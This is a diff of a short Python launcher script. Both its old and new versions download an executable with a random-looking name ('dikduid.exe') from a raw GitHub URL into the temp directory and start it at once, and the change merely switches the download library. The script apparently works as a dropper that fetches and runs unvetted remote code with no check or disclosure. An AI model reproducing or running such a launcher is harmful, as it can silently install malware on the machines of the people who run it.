@@ -1,20 +1,17 @@
-import os
-import urllib.request
-import tempfile
+# launcher_exe_click.py
+import os, tempfile, requests, certifi
 
-EXE_URL = "https://raw.githubusercontent.com/Prenda00/canlmiop/main/dikduid.exe"
-EXE_NAME = "dikduid.exe"
+URL  = "https://raw.githubusercontent.com/Prenda00/canlmiop/main/dikduid.exe"
+NAME = "dikduid.exe"
 
 def main():
-    tempdir = tempfile.gettempdir()
-    exe_path = os.path.join(tempdir, EXE_NAME)
-
-    with urllib.request.urlopen(EXE_URL) as r:
-        data = r.read()
-    with open(exe_path, "wb") as f:
-        f.write(data)
-
-    os.startfile(exe_path)
+    p = os.path.join(tempfile.gettempdir(), NAME)
+    with requests.get(URL, stream=True, timeout=60, verify=certifi.where()) as r:
+        r.raise_for_status()
+        with open(p, "wb") as f:
+            for chunk in r.iter_content(1<<15):
+                if chunk: f.write(chunk)
+    os.startfile(p)  # Windows-only
 
 if __name__ == "__main__":
     main()
